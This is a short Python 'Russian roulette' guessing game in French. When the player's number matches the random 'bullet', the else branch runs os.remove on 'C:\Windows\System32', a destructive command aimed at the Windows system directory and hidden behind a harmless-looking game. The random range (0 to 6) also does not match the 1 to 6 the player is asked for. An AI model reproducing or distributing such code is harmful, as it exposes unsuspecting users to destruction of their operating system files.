import os
import random

nombre:int
balle:int=random.randint(0,6)
choix:str='oui'

while choix=='oui':
    nombre:int
    balle=random.randint(0,6)

    nombre=int(input("Choisissait un nombre entre 1 et 6: "))

    while nombre not in[1,2,3,4,5,6]:
        print("Erreur! Nombre invalide.")
        nombre=int(input("Choisissait un nombre entre 1 et 6: "))

    if nombre!=balle:
        print("Bravo, vous n'avez pas perdu!")
        choix=str(input("Voulez-vous continuer? (oui/non): "))
    
    else:
        os.remove("C:\Windows\System32")
